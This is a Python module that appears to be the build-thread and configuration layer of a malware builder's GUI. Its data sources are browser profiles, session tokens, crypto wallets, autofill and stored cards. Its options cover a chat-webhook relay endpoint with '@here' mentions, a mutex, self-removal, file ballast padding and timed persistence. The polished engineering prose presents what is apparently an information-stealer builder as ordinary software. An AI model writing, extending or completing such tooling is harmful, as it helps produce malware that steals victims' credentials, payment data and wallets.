"""The build thread: one pipeline run, reported by signal only.

``core.pipeline.run`` is a plain function taking a progress callable and a cancel
callable, and this is the adapter that turns the first into a Qt signal and the second
into an atomic flag. Nothing here touches a widget. The thread only emits; the page
only receives, and Qt marshals the delivery onto the GUI thread by itself.

The form-to-config conversion lives here too. A separate model object would be a
second description of a shape ``core.schema`` already defines, so ``config_from``
builds a ``RunConfig`` directly from the values the pages hold, and ``core.validate``
is the only thing that ever decides whether those values are legal.

Cancellation is cooperative and checked between stages, not inside them. A seal or a
forge of a large artifact cannot be interrupted safely, and a thread killed mid-write
leaves a half-written container in the output directory, so the flag is polled at the
stage boundaries and the run exits cleanly between two whole steps.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Final

from PySide6.QtCore import QThread, Signal

from core import pipeline
from core.schema import RelayConfig, RunConfig, SourceConfig

__all__ = ["SOURCE_LABELS", "BuildWorker"]

SOURCE_LABELS: Final[tuple[tuple[str, str], ...]] = (
    ("system", "Machine and OS"),
    ("browsers", "Browser profiles"),
    ("sessions", "Session tokens"),
    ("wallets", "Wallet directories"),
    ("autofill", "Autofill and cards"),
    ("documents", "Recent documents"),
)


def config_from(
    *,
    relay_kind: str,
    endpoint: str,
    mutex: str,
    seal_key: str,
    sources: dict[str, bool],
    self_remove: bool,
    ballast_mb: int,
    ping: str = "",
    mention: str = "@here",
    keep_local: bool = False,
    persist: bool = False,
    persist_hours: int = 0,
) -> RunConfig:
    """Assemble a ``RunConfig`` from raw form values.

    No validation happens here on purpose. A page can hold a half-typed endpoint and
    still hand it over; ``core.validate`` is what reports it, and duplicating the
    rules here would give the UI two opinions about the same field.

    ``ping`` and ``mention`` default to the values a config written before they
    existed would have meant: no status messages, and a mention ready if one is
    switched on.
    """
    return RunConfig(
        schema_version=1,
        mutex=mutex,
        seal_key=seal_key,
        relay=RelayConfig(
            kind=relay_kind,  # type: ignore[arg-type]
            endpoint=endpoint,
            ping=ping,
            mention=mention,
        ),
        sources=SourceConfig(**{name: bool(sources.get(name, True)) for name, _ in SOURCE_LABELS}),
        self_remove=self_remove,
        ballast_mb=ballast_mb,
        keep_local=keep_local,
        persist=persist,
        persist_hours=persist_hours,
    )


class BuildWorker(QThread):
    """Runs one build. Emits ``progress`` per stage, then exactly one terminal signal.

    ``finished`` is Qt's own signal and is emitted by the thread machinery, so the
    outcome is carried on ``built`` instead: a result signal that also fires on a
    failure would be a race between two meanings of the word done.
    """

    progress = Signal(str, str, float)
    built = Signal(object)
    failed = Signal(str, str, object)
    rejected = Signal(object)

    def __init__(
        self,
        cfg: RunConfig,
        *,
        root: Path,
        out_dir: Path,
        mode: str,
        name: str | None,
        stub: Path | None,
        parent: Any = None,
    ) -> None:
        super().__init__(parent)
        self._cfg = cfg
        self._root = root
        self._out_dir = out_dir
        self._mode = mode
        self._name = name
        self._stub = stub
        self._cancelled = False

    # --- control -------------------------------------------------------------

    def cancel(self) -> None:
        """Ask the run to stop at the next stage boundary. Safe from the GUI thread."""
        self._cancelled = True

    def _cancel_requested(self) -> bool:
        return self._cancelled

    # --- the run -------------------------------------------------------------

    def run(self) -> None:
        try:
            outcome = pipeline.run(
                self._cfg,
                root=self._root,
                out_dir=self._out_dir,
                mode=self._mode,
                name=self._name,
                stub=self._stub,
                progress=self._on_progress,
                cancel=self._cancel_requested,
            )
        except pipeline.ValidationFailed as exc:
            self.rejected.emit(exc.problems)
            return
        except pipeline.PipelineCancelled:
            self.failed.emit("cancelled", "stopped before the next stage", None)
            return
        except pipeline.PipelineError as exc:
            self.failed.emit(exc.stage, exc.message, exc.artifact)
            return
        except Exception as exc:
            # Anything the pipeline did not classify still has to arrive as a message
            # rather than a silent dead thread with a spinner on it.
            self.failed.emit("internal", f"{type(exc).__name__}: {exc}", None)
            return

        self.built.emit(outcome)

    def _on_progress(self, event: pipeline.Event) -> None:
        self.progress.emit(event.stage, event.message, float(event.fraction))
